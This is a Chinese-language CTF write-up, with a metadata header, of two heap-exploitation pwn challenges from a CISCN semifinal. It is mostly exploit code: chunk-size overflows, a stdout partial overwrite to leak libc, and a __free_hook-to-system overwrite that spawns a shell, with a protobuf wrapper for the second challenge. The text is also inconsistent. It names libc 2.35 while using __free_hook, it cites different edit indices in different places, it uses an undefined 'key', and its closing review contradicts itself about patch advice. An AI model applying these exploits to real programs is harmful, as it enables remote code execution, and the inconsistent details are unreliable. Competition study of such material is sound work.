---
title: CCB CISCN 半决赛 AWDP pwn 题解 (2 道)
contest: CISCN 半决赛 (AWDP)
year: 2024
difficulty: medium
vuln_type: heap_exploit
tags: [AWDP, libc 2.35, tcache dup, stdout leak, __free_hook, protobuf]
attack_chain: |
  1. 题 1 (传统堆菜单 add/rm/edit): add 8 个 0x80-0xF0 块 → edit(0) 0x90 padding + p64(0xFFFF) 覆盖 chunk1 size 触发 chunk overlapping → edit(1, 0x200) 写 size 0x4f1 跨多个块
  2. rm(4)/rm(3)/rm(2) 触发 consolidate → 通过 partial overwrite 0x70 chunk 链让 stdout 落入可控区
  3. stdout = (libc.sym['_IO_2_1_stdout_'] - 0x10) & 0x0FFF 取低 12 位爆破
  4. add(2, 0x70) + add(3, 0x70) + edit(1, 0x1f8 padding + p16(stdout+0x2000)) 改 stdout 指针 → 申请到 stdout 上写 _IO_read_base 触发输出 → 泄 libc_base = u64 - 2017664
  5. add(6, 0xe0) + add(7, 0xe0) + edit(7, 0x40 padding + p64(0) + p64(system)) 写 __free_hook → edit(1, 0xF8 padding + '/bin/sh\x00') → rm(2) 触发 __free_hook→system("/bin/sh")
  6. 题 2 (protobuf 协议): .proto syntax = "proto3"; message pwn2 { int32 option = 1; int32 chunk_sizes = 2; int32 heap_chunks_id = 3; bytes heap_content = 4; } → protoc --python_out=. pwn2.proto
  7. 数据格式: p32(len(raw)) + raw serialized protobuf → option 1=add/2=rm/3=edit/4=show
  8. 8 个 0x100 chunk + edit(1, 0x108 padding + p64(0x110*4+1)) 触发 unsorted bin → rm(2) → add(0x100) → show(3) 泄 libc_base = u64 - 2169632
  9. add(0x100)+rm(8) 触发 tcache chunk 复用 → show(3) 泄 heap_base = key << 12
 10. edit(1, 0x108 padding + p64(0x111) + p64(key ^ _IO_2_1_stdout_)) 改 stdout fd → 申请到 stdout 写 fake file
key_payload: |
  # 题 1 完整利用:
  add(0,0x80); add(1,0xF0); add(2,0xF0); add(3,0xF0); add(4,0xF0); add(5,0xF0); add(6,0xe0); add(7,0xe0)
  # 覆盖 chunk1 size
  pay = b'A'*0x90 + p64(0xFFFF)
  edit(1,0x200,pay)
  rm(4); rm(3); rm(2)
  # 爆破 stdout 低 12 位
  stdout = (libc.sym['_IO_2_1_stdout_'] - 0x10) & 0x0FFF
  pay = b'\x00'*0x1f8 + p16(stdout+0x2000)
  edit(1,len(pay),pay)
  add(8,0xF0)
  add(9,0xF0)
  pay = p64(0) + p64(0xFBAD1800) + p64(0)*3 + p8(0)
  edit(9,len(pay),pay)
  libc_base = uu64(r(8)) - 2017664
  # __free_hook → system
  pay = 0x4f8 * b'\x00' + p64(free_hook - 0x10)
  edit(1,len(pay),pay)
  add(6,0xe0); add(7,0xe0)
  edit(7,0x40,p64(0)+p64(libc.sym['system']))
  pay = 0xF8 * b'/' + b'/bin/sh\x00'
  edit(1,len(pay),pay)
  rm(2)
one_liner: CCB CISCN 半决赛 AWDP 模式 pwn 双题 (传统菜单 + protobuf 协议)，都是 stdout partial overwrite + __free_hook/system。
lesson: AWDP 模式 (Attack With Defense Plus) 攻防兼备，2 道都用 stdout partial overwrite 12 位爆破；protobuf 协议要熟悉 `p32(len) + raw` 的包装。
quality: medium
---

# CCB CISCN 半决赛 AWDP pwn 题解

> 来源: ctfiot.com 243175

## 比赛背景

CCB CISCN 半决赛采用 **AWDP** (Attack With Defense Plus) 模式：每支队伍在比赛开始时拿到题目环境，先要写 patch 修自己的漏洞，同时打其他队的环境拿 flag。所以 exp 不仅要通用还要考虑不同队的 patch 差异。

## 题 1: 传统堆菜单

菜单 add(0, size) / rm(idx) / edit(idx, size, data)，固定 0x90/0xF0/0xe0 三种 size 范围。

**核心攻击链：**
```python
add(0,0x80); add(1,0xF0); add(2,0xF0); add(3,0xF0); add(4,0xF0); add(5,0xF0); add(6,0xe0); add(7,0xe0)

# edit(0) 跨块溢出改 chunk1 size
pay = b'A' * 0x90 + p64(0xFFFF)
edit(0, len(pay), pay)

# 后续 edit(1, 0x200) 实际跨越多个 chunk
edit(1, 0x200, pay)

# 释放触发 consolidate
rm(4); rm(3); rm(2)

# partial overwrite 命中 stdout
stdout = (libc.sym['_IO_2_1_stdout_'] - 0x10) & 0x0FFF  # 取低 12 位
pay = b'\x00' * 0x1f8 + p16(stdout + 0x2000)
edit(1, len(pay), pay)
add(8, 0xF0); add(9, 0xF0)
# 申请到 stdout 上写 _IO_read_base
pay = p64(0) + p64(0xFBAD1800) + p64(0)*3 + p8(0)
edit(9, len(pay), pay)
libc_base = uu64(r(8)) - 2017664

# 改 __free_hook → system
pay = 0x4f8 * b'\x00' + p64(free_hook - 0x10)
edit(1, len(pay), pay)
add(6, 0xe0); add(7, 0xe0)
edit(7, 0x40, p64(0) + p64(libc.sym['system']))

# /bin/sh 触发 free
pay = 0xF8 * b'/' + b'/bin/sh\x00'
edit(1, len(pay), pay)
rm(2)
```

## 题 2: protobuf 协议

```protobuf
syntax = "proto3";
package mypackage;

message pwn2 {
  int32 option = 1;
  int32 chunk_sizes = 2;
  int32 heap_chunks_id = 3;
  bytes heap_content = 4;
}
```

序列化：`p32(len(raw)) + raw` 传给 server，option 1=add/2=rm/3=edit/4=show。

**核心攻击链：**
```python
# protoc --python_out=. pwn2.proto
import pwn2_pb2

def add(size, text=b'123', idx=0):
    data = pwn2_pb2.pwn2()
    data.option = 1; data.chunk_sizes = size
    data.heap_chunks_id = idx; data.heap_content = text
    s(p32(len(data.SerializeToString())) + data.SerializeToString())

# 8 个 0x100 chunk
for i in range(8): add(0x100, str(i+1).encode())

# edit 触发 unsorted bin
pay = b'A' * 0x108 + p64(0x110*4 + 1)
edit(1, len(pay), pay)
rm(2)
add(0x100, b'8')  # 申请切割 unsorted bin
show(3)  # 泄 libc
libc_base = uu64(r(6)) - 2169632

# 泄 heap (tcache fd ^ heap>>12)
add(0x100, b'8')
rm(8)
show(3)
heap_base = uu64(r(5)) << 12

# 写 stdout fd
rm(2)
pay = b'A' * 0x108 + p64(0x111) + p64(key ^ libc.sym['_IO_2_1_stdout_'])
edit(1, len(pay), pay)
```

## 评价

AWDP 模式对 exp 通用性要求高（不同队 patch 后行为可能不同），作者把两道都用 12 位 stdout partial overwrite 通用化处理，给的 patch 思路也明确。但内容比较碎，是边打边记的 exp 而非完整 writeup，缺 attack surface 分析、patch 修补建议等 AWDP 必要环节。
